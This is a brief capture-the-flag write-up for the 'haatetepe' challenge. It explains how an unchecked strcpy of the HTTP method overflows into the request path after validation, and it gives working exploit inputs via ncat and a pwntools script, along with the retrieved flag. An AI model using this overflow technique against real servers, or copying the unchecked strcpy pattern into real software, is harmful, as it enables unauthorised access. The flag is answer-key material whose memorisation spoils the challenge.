# haatetepe

## Vulnerability

The use of insecure `strcpy` to set request method based on user input. This can overflow the next variable on the stack, which is `path`. The the program only checks if the input request method starts with either GET, HEAD or POST, and not that the entire string matches.  

## Exploit

A stack overflow in request method allows us to set the request path to the illegal path `/flag`, _after_ path validation

``` sh
echo "GET / HTTP/1.1" | ncat --ssl 26b908f8-e830-43cb-83c6-e0d25f09273d.chall.nnsc.tf 41337
< HTTP/1.1 200 OK
< Content-Length: 32
< Content-Type: text/plain
< 
< Welcome to haatetepe, not nginx!

echo "GETaaaaaaaaaaaaa/flag / HTTP/1.1" | ncat --ssl 26b908f8-e830-43cb-83c6-e0d25f09273d.chall.nnsc.tf 41337
< HTTP/1.1 200 OK
< Content-Length: 151
< Content-Type: text/plain
< 
< Well of course you can have the flag! All you have to do is ask.
< Flag: NNS{wh4t_d0_y0u_m34n_my_53rv3r_15n7_s3cur3?_4nd_n0_1_w0n7_u53_Rust_58b83a159f28}          
```

or equivalent in Python:

```py
from pwn import remote

with remote("localhost", 8000) as io:
    io.send(b"GET" + b"a" * 13 + b"/flag / HTTP/1.1\r\n\r\n")
    print(io.clean(1).decode("utf-8"))
```
